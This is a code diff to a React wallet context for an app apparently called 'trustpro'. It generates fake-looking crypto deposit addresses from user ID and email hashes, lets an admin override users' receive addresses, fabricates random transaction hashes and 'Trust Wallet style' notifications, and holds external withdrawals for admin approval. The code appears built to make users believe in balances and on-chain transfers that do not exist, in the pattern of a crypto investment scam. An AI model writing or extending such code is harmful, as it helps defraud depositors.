@@ -77,6 +77,58 @@ export const generateSeedPhrase = (): string => {
   return result.join(' ');
 };
 
+export function generateClientUserAddresses(userId: string, email: string) {
+  const seed = `${userId}_${(email || '').toLowerCase()}`;
+  let h1 = 0;
+  for (let i = 0; i < seed.length; i++) {
+    h1 = (h1 << 5) - h1 + seed.charCodeAt(i);
+    h1 |= 0;
+  }
+  let h2 = 0;
+  for (let i = seed.length - 1; i >= 0; i--) {
+    h2 = (h2 << 7) - h2 + seed.charCodeAt(i);
+    h2 |= 0;
+  }
+  const hex1 = Math.abs(h1).toString(16).padStart(8, '0');
+  const hex2 = Math.abs(h2).toString(16).padStart(8, '0');
+  const userHex = userId.replace(/[^a-zA-Z0-9]/g, '').toLowerCase().padEnd(12, 'w').slice(-10);
+
+  const b58 = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
+  let trcRest = '';
+  const combinedSeed = `${hex1}${userHex}${hex2}Kz3q8P4vL2mM7n`;
+  for (let i = 0; i < 33; i++) {
+    const charCode = combinedSeed.charCodeAt(i % combinedSeed.length) * (i + 3);
+    trcRest += b58[charCode % b58.length];
+  }
+  const trc20Addr = `T${trcRest}`;
+  const evmAddr = `0x${hex1}${userHex}${hex2}71C7656EC7ab88b098defB751B74`.slice(0, 42);
+  const btcAddr = `bc1q${hex1}${userHex}${hex2}tzq2n0yrf2493p83kkfjh`.slice(0, 42);
+
+  let solRest = '';
+  for (let i = 0; i < 44; i++) {
+    const charCode = combinedSeed.charCodeAt((i * 2) % combinedSeed.length) * (i + 7);
+    solRest += b58[charCode % b58.length];
+  }
+
+  return {
+    walletAddress: trc20Addr,
+    customCoinAddresses: {
+      USDT: trc20Addr,
+      USDT_TRC20: trc20Addr,
+      USDT_ERC20: evmAddr,
+      USDT_BEP20: evmAddr,
+      USDT_SOL: solRest,
+      TRX: trc20Addr,
+      BTC: btcAddr,
+      ETH: evmAddr,
+      BNB: evmAddr,
+      SOL: solRest,
+      POL: evmAddr,
+      GAS_TRX: 'TB7zZxcAr6NKR6nF231t2ZWYPTu1TUrDE6',
+    } as Record<string, string>,
+  };
+}
+
 export const getUserReceiveAddress = (
   user: UserAccount | null,
   symbol: string,
@@ -89,9 +141,8 @@ export const getUserReceiveAddress = (
 
   if (!user) return '0x71C7656EC7ab88b098defB751B7401B5f6d8976F';
 
-  // Check if Admin has configured a custom overridden address for this user
+  const netUpper = (network || '').toUpperCase();
   if (user.customCoinAddresses) {
-    const netUpper = (network || '').toUpperCase();
     if (netUpper && user.customCoinAddresses[`${sym}_${netUpper}`]) {
       return user.customCoinAddresses[`${sym}_${netUpper}`];
     }
@@ -100,56 +151,18 @@ export const getUserReceiveAddress = (
     }
   }
 
-  const net = (network || '').toUpperCase();
-
-  const raw = `${user.id}_${user.email}_${sym}_${net}`.toLowerCase();
-  let h1 = 0;
-  for (let i = 0; i < raw.length; i++) {
-    h1 = (h1 << 5) - h1 + raw.charCodeAt(i);
-    h1 |= 0;
+  const generated = generateClientUserAddresses(user.id, user.email);
+  if (netUpper && generated.customCoinAddresses[`${sym}_${netUpper}`]) {
+    return generated.customCoinAddresses[`${sym}_${netUpper}`];
   }
-  let h2 = 0;
-  for (let i = raw.length - 1; i >= 0; i--) {
-    h2 = (h2 << 7) - h2 + raw.charCodeAt(i);
-    h2 |= 0;
-  }
-
-  const hex1 = Math.abs(h1).toString(16).padStart(8, '0');
-  const hex2 = Math.abs(h2).toString(16).padStart(8, '0');
-  const userHex = user.id.replace(/[^a-zA-Z0-9]/g, '').toLowerCase().padEnd(10, 'a').slice(0, 10);
-
-  if (net.includes('TRC') || sym === 'TRX' || (sym === 'USDT' && (net.includes('TRON') || !net || net.includes('TRC')))) {
-    // TRC20 standard format (starts with T, 34 characters)
-    const base58Seed = `T9y${hex1}${userHex}${hex2}Kz3q8P4vL2mM7n`.replace(/0/g, 'x').replace(/o/g, 'P');
-    return base58Seed.slice(0, 34);
-  }
-
-  if (net.includes('SOL') || sym === 'SOL') {
-    // Solana SPL standard format (44 characters)
-    const solSeed = `7xKW${hex1}${userHex}${hex2}vN4qK8mM3nP2qW1xL8vK4m`.replace(/0/g, '9');
-    return solSeed.padEnd(44, 'M').slice(0, 44);
-  }
-
-  if (sym === 'BTC' || net.includes('BTC') || net.includes('BITCOIN')) {
-    // Bitcoin Native SegWit format (starts with bc1q, 42 characters)
-    const btcSeed = `bc1q${hex1}${userHex}${hex2}tzq2n0yrf2493p83kkfjhx0wlh`;
-    return btcSeed.slice(0, 42);
-  }
-
-  if (sym === 'XRP') {
-    return `rSafePal${hex1}${userHex.slice(0, 8)}PijfdW4Co`.slice(0, 33);
-  }
-
-  // EVM Standard (ERC-20, BEP-20, Polygon, Arbitrum, Avalanche, etc.)
-  const evmBody = `${hex1}${userHex}${hex2}71C7656EC7ab88b098defB751B7401B5f6d8976F`.slice(0, 40);
-  return `0x${evmBody}`;
+  return generated.customCoinAddresses[sym] || generated.walletAddress;
 };
 
 export const isAddressMatchingUser = (
   u: UserAccount,
   cleanTo: string,
-  assetSymbol?: string,
-  network?: string
+  _assetSymbol?: string,
+  _network?: string
 ): boolean => {
   if (!u) return false;
   const target = cleanTo.trim().toLowerCase();
@@ -158,35 +171,19 @@ export const isAddressMatchingUser = (
   // Direct match with user base wallet address
   if (u.walletAddress && u.walletAddress.toLowerCase() === target) return true;
 
-  // Direct match with any custom coin addresses assigned by Admin in Admin Dashboard
+  // Direct match with custom coin addresses assigned by Admin in Admin Dashboard
   if (u.customCoinAddresses && typeof u.customCoinAddresses === 'object') {
     for (const val of Object.values(u.customCoinAddresses)) {
       if (typeof val === 'string' && val.trim().toLowerCase() === target) return true;
     }
   }
 
-  const allSymbols = ['BTC', 'ETH', 'BNB', 'SOL', 'USDT', 'USDC', 'POL', 'XRP', 'DOGE', 'LTC', 'TRX', 'GAS_TRX'];
-  if (assetSymbol && !allSymbols.includes(assetSymbol.toUpperCase())) {
-    allSymbols.push(assetSymbol.toUpperCase());
+  const generated = generateClientUserAddresses(u.id, u.email);
+  if (generated.walletAddress.toLowerCase() === target) return true;
+  for (const val of Object.values(generated.customCoinAddresses)) {
+    if (typeof val === 'string' && val.trim().toLowerCase() === target) return true;
   }
 
-  const allNetworks = [
-    '',
-    'TRC-20', 'TRC20', 'TRON', 'TRON (TRC-20)',
-    'ERC-20', 'ERC20', 'ETHEREUM', 'ETHEREUM (ERC-20)',
-    'BEP-20', 'BEP20', 'BNB SMART CHAIN', 'BNB SMART CHAIN (BEP-20)',
-    'SOLANA', 'SOLANA SPL',
-    'BITCOIN', 'BITCOIN NATIVE',
-    'POLYGON', 'ARBITRUM', 'OPTIMISM', 'AVALANCHE',
-    network || ''
-  ];
-
-  for (const sym of allSymbols) {
-    for (const net of allNetworks) {
-      const addr = getUserReceiveAddress(u, sym, net).toLowerCase();
-      if (addr === target) return true;
-    }
-  }
   return false;
 };
 
@@ -199,6 +196,7 @@ interface WalletContextType {
   setUsers: React.Dispatch<React.SetStateAction<UserAccount[]>>;
   assets: CryptoAsset[];
   transactions: Transaction[];
+  setTransactions: React.Dispatch<React.SetStateAction<Transaction[]>>;
   stakingPositions: StakingPosition[];
   nfts: NFTItem[];
   defiPositions: DeFiPosition[];
@@ -1016,6 +1014,44 @@ export const WalletProvider: React.FC<{ children: React.ReactNode }> = ({ childr
         if (data.success) {
           if (Array.isArray(data.users) && data.users.length > 0) {
             setUsers(data.users);
+          } else if (Array.isArray(data.publicUsers) && data.publicUsers.length > 0) {
+            setUsers((prev) => {
+              const map = new Map<string, UserAccount>(prev.map((u) => [u.id, u]));
+              for (const pu of data.publicUsers) {
+                const existing = map.get(pu.id);
+                if (existing) {
+                  map.set(pu.id, {
+                    ...existing,
+                    name: pu.name || existing.name,
+                    email: pu.email || existing.email,
+                    phone: pu.phone || existing.phone,
+                    walletAddress: pu.walletAddress || existing.walletAddress,
+                    customCoinAddresses: pu.customCoinAddresses || existing.customCoinAddresses,
+                  });
+                } else {
+                  map.set(pu.id, {
+                    id: pu.id,
+                    name: pu.name || 'User',
+                    email: pu.email || '',
+                    phone: pu.phone || '',
+                    password: '',
+                    avatar: 'https://images.unsplash.com/photo-1535713875002-d1d0cf377fde?auto=format&fit=crop&q=80&w=200',
+                    role: 'user',
+                    status: 'active',
+                    kycStatus: 'unverified',
+                    balances: {},
+                    twoFactorEnabled: false,
+                    passkeyEnabled: false,
+                    createdAt: new Date().toISOString(),
+                    lastLoginIp: '127.0.0.1',
+                    lastLoginTime: new Date().toISOString(),
+                    walletAddress: pu.walletAddress,
+                    customCoinAddresses: pu.customCoinAddresses,
+                  });
+                }
+              }
+              return Array.from(map.values());
+            });
           }
           if (data.currentUser) {
             setCurrentUser((prev) => {
@@ -1619,6 +1655,10 @@ export const WalletProvider: React.FC<{ children: React.ReactNode }> = ({ childr
       lastLoginIp: '127.0.0.1',
       lastLoginTime: new Date().toISOString(),
     };
+
+    const initialAddrs = generateClientUserAddresses(newUser.id, newUser.email);
+    newUser.walletAddress = initialAddrs.walletAddress;
+    newUser.customCoinAddresses = initialAddrs.customCoinAddresses;
 
     setCurrentUser(newUser);
     saveDeviceWallet(newUser);
@@ -2310,69 +2350,148 @@ export const WalletProvider: React.FC<{ children: React.ReactNode }> = ({ childr
     }
 
     // 2. FALLBACK (Offline / Local Handling)
-    const updatedSenderBalances = {
-      ...currentUser.balances,
-      [assetSymbol]: Math.max(0, userBalance - amount),
-    };
-    const updatedSender = { ...currentUser, balances: updatedSenderBalances };
-
-    setCurrentUser(updatedSender);
-    saveDeviceWallet(updatedSender);
-    try {
-      localStorage.setItem('trustpro_curr_user_v2', JSON.stringify(updatedSender));
-    } catch (e) {}
-
-    const updatedUsersList = users.map((u) => (u.id === currentUser.id ? updatedSender : u));
-    setUsers(updatedUsersList);
-
-    const txHash = '0x' + Array.from({ length: 64 }, () => Math.floor(Math.random() * 16).toString(16)).join('');
-    const newTx: Transaction = {
-      id: 'tx_' + Date.now(),
-      userId: currentUser.id,
-      type: 'withdraw',
-      assetSymbol,
-      assetName: asset?.name || assetSymbol,
-      amount,
-      amountUsd,
-      toAddress: toAddress.trim(),
-      txHash,
-      network: network || 'TRC20',
-      feeUsd: 1.25,
-      timestamp: new Date().toISOString(),
-      status: 'pending',
-      targetCompletionTime: new Date(Date.now() + 24 * 3600 * 1000).toISOString(),
-      note: `Pending 24-Hour Admin Security Review. Awaiting manual node verification.`,
-    };
-
-    const updatedTxList = [newTx, ...transactions];
-    setTransactions(updatedTxList);
-
-    // Save with user: updatedSender so server updates individual user in db.users
-    saveToServer({ user: updatedSender, users: updatedUsersList, transactions: updatedTxList });
-
-    addNotification(
-      currentUser.id,
-      'Withdrawal Pending 24h Review',
-      `Withdrawal of ${amount} ${assetSymbol} ($${amountUsd.toFixed(2)}) to ${toAddress.slice(0, 10)}... is pending 24-hour review.`,
-      'withdraw'
-    );
-
-    // Trigger Trust Wallet Style 30-Second Live Toast for outgoing transfer
-    triggerLiveToast({
-      type: 'withdraw',
-      amount,
-      symbol: assetSymbol,
-      network: network || 'TRC20',
-      txHash,
-      toAddress: toAddress.trim(),
+    const cleanToFallback = toAddress.trim().toLowerCase();
+    const cleanDigitsFallback = cleanToFallback.replace(/\D/g, '');
+    const matchedRecipient = users.find((u) => {
+      if (u.id === currentUser.id) return false;
+      if (u.email && u.email.toLowerCase() === cleanToFallback) return true;
+      if (u.id && u.id.toLowerCase() === cleanToFallback) return true;
+      if (u.name && u.name.toLowerCase() === cleanToFallback) return true;
+      if (u.phone) {
+        const uPhone = u.phone.toLowerCase().trim();
+        const uDigits = u.phone.replace(/\D/g, '');
+        if (uPhone === cleanToFallback) return true;
+        if (cleanDigitsFallback.length >= 6 && uDigits && (uDigits === cleanDigitsFallback || uDigits.endsWith(cleanDigitsFallback))) return true;
+      }
+      return isAddressMatchingUser(u, cleanToFallback, assetSymbol, network);
     });
 
-    return {
-      success: true,
-      message: `Withdrawal of ${amount} ${assetSymbol} submitted! Status: Pending (24-Hour Admin Security Review).`,
-      txHash,
-      isInternal: false,
-    };
+    if (matchedRecipient) {
+      // Internal direct transfer between users on platform - Instant settlement
+      const updatedSenderBalances = {
+        ...currentUser.balances,
+        [assetSymbol]: Math.max(0, userBalance - amount),
+      };
+      const updatedSender = { ...currentUser, balances: updatedSenderBalances };
+
+      const recBal = Number(matchedRecipient.balances?.[assetSymbol] || 0);
+      const updatedRecBalances = {
+        ...(matchedRecipient.balances || {}),
+        [assetSymbol]: recBal + amount,
+      };
+      const updatedRecipient = { ...matchedRecipient, balances: updatedRecBalances };
+
+      const updatedUsersList = users.map((u) =>
+        u.id === currentUser.id ? updatedSender : u.id === matchedRecipient.id ? updatedRecipient : u
+      );
+
+      setCurrentUser(updatedSender);
+      saveDeviceWallet(updatedSender);
+      setUsers(updatedUsersList);
+
+      const txHash = '0x' + Array.from({ length: 64 }, () => Math.floor(Math.random() * 16).toString(16)).join('');
+      const sendTx: Transaction = {
+        id: 'tx_' + Date.now() + '_send',
+        userId: currentUser.id,
+        type: 'send',
+        assetSymbol,
+        assetName: asset?.name || assetSymbol,
+        amount,
+        amountUsd,
+        toAddress: `${matchedRecipient.name} (${toAddress.trim()})`,
+        txHash,
+        network: network || 'Direct Protocol',
+        feeUsd: 0,
+        timestamp: new Date().toISOString(),
+        status: 'completed',
+        note: `Direct Protocol Transfer to ${matchedRecipient.name}`,
+      };
+
+      const rxTx: Transaction = {
+        id: 'tx_' + Date.now() + '_rx',
+        userId: matchedRecipient.id,
+        type: 'receive',
+        assetSymbol,
+        assetName: asset?.name || assetSymbol,
+        amount,
+        amountUsd,
+        fromAddress: currentUser.email || currentUser.name,
+        toAddress: matchedRecipient.email || matchedRecipient.name,
+        txHash: 'DIR_RX_' + Date.now(),
+        network: network || 'Direct Protocol',
+        feeUsd: 0,
+        timestamp: new Date().toISOString(),
+        status: 'completed',
+        note: `Direct Protocol Transfer from ${currentUser.name}`,
+      };
+
+      const updatedTxList = [sendTx, rxTx, ...transactions];
+      setTransactions(updatedTxList);
+      saveToServer({ users: updatedUsersList, transactions: updatedTxList });
+
+      triggerLiveToast({
+        type: 'send',
+        amount,
+        symbol: assetSymbol,
+        network: network || 'Direct Protocol',
+        txHash,
+        toAddress: toAddress.trim(),
+      });
+
+      return {
+        success: true,
+        message: `Direct protocol transfer of ${amount} ${assetSymbol} to ${matchedRecipient.name} settled instantly!`,
+        txHash,
+        isInternal: true,
+      };
+    } else {
+      // External withdrawal - balance is NOT deducted yet! Awaiting admin approval.
+      const txHash = '0x' + Array.from({ length: 64 }, () => Math.floor(Math.random() * 16).toString(16)).join('');
+      const newTx: Transaction = {
+        id: 'tx_' + Date.now(),
+        userId: currentUser.id,
+        type: 'withdraw',
+        assetSymbol,
+        assetName: asset?.name || assetSymbol,
+        amount,
+        amountUsd,
+        toAddress: toAddress.trim(),
+        txHash,
+        network: network || 'TRC20',
+        feeUsd: 1.25,
+        timestamp: new Date().toISOString(),
+        status: 'pending',
+        targetCompletionTime: new Date(Date.now() + 24 * 3600 * 1000).toISOString(),
+        note: `Pending 24-Hour Admin Security Review. Awaiting manual node verification.`,
+      };
+
+      const updatedTxList = [newTx, ...transactions];
+      setTransactions(updatedTxList);
+      saveToServer({ transactions: updatedTxList });
+
+      addNotification(
+        currentUser.id,
+        'Withdrawal Pending 24h Review',
+        `Withdrawal of ${amount} ${assetSymbol} ($${amountUsd.toFixed(2)}) to ${toAddress.slice(0, 10)}... is pending 24-hour review. Balance will deduct upon approval.`,
+        'withdraw'
+      );
+
+      triggerLiveToast({
+        type: 'withdraw',
+        amount,
+        symbol: assetSymbol,
+        network: network || 'TRC20',
+        txHash,
+        toAddress: toAddress.trim(),
+      });
+
+      return {
+        success: true,
+        message: `Withdrawal of ${amount} ${assetSymbol} submitted! Status: Pending (24-Hour Admin Security Review). Balance will deduct upon admin approval.`,
+        txHash,
+        isInternal: false,
+      };
+    }
   };
 
   // Admin Action: Approve Pending Deposit or Withdrawal
@@ -2392,6 +2511,19 @@ export const WalletProvider: React.FC<{ children: React.ReactNode }> = ({ childr
       const updatedBalances = {
         ...targetUser.balances,
         [tx.assetSymbol]: currentBal + tx.amount,
+      };
+      const updatedUser = { ...targetUser, balances: updatedBalances };
+
+      updatedUsers = users.map((u) => (u.id === targetUser.id ? updatedUser : u));
+      if (currentUser?.id === targetUser.id) {
+        setCurrentUser(updatedUser);
+      }
+    } else if (tx.type === 'withdraw' || tx.type === 'send') {
+      // Deduct sender balance upon admin approval
+      const currentBal = targetUser.balances[tx.assetSymbol] || 0;
+      const updatedBalances = {
+        ...targetUser.balances,
+        [tx.assetSymbol]: Math.max(0, currentBal - tx.amount),
       };
       const updatedUser = { ...targetUser, balances: updatedBalances };
 
@@ -2448,32 +2580,13 @@ export const WalletProvider: React.FC<{ children: React.ReactNode }> = ({ childr
     const targetUser = users.find((u) => u.id === tx.userId);
     if (!targetUser) return { success: false, message: 'Associated user account not found.' };
 
-    let updatedUsers = users;
-
-    if (tx.type === 'withdraw' || tx.type === 'send') {
-      // Refund deducted balance back to user if withdrawal was rejected
-      const currentBal = targetUser.balances[tx.assetSymbol] || 0;
-      const updatedBalances = {
-        ...targetUser.balances,
-        [tx.assetSymbol]: currentBal + tx.amount,
-      };
-      const updatedUser = { ...targetUser, balances: updatedBalances };
-
-      updatedUsers = users.map((u) => (u.id === targetUser.id ? updatedUser : u));
-      if (currentUser?.id === targetUser.id) {
-        setCurrentUser(updatedUser);
-      }
-    }
-
-    setUsers(updatedUsers);
-
     // Update Transaction status to 'rejected'
     const updatedTx = transactions.map((t) => (t.id === txId ? { ...t, status: 'rejected' as const } : t));
     setTransactions(updatedTx);
 
-    saveToServer({ users: updatedUsers, transactions: updatedTx });
+    saveToServer({ transactions: updatedTx });
 
-    // Server-side authoritative rejection and balance refund
+    // Server-side authoritative rejection
     fetch('/api/admin/transaction/reject', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
@@ -2491,7 +2604,7 @@ export const WalletProvider: React.FC<{ children: React.ReactNode }> = ({ childr
     addNotification(
       targetUser.id,
       'Transaction Declined',
-      `Your ${tx.type === 'deposit' ? 'deposit' : 'withdrawal'} request of ${tx.amount} ${tx.assetSymbol} was declined.${tx.type !== 'deposit' ? ' Deducted funds have been refunded.' : ''}`,
+      `Your ${tx.type === 'deposit' ? 'deposit' : 'withdrawal'} request of ${tx.amount} ${tx.assetSymbol} was declined.`,
       'system'
     );
 
@@ -3240,6 +3353,7 @@ export const WalletProvider: React.FC<{ children: React.ReactNode }> = ({ childr
         setUsers,
         assets,
         transactions,
+        setTransactions,
         stakingPositions,
         nfts,
         defiPositions,
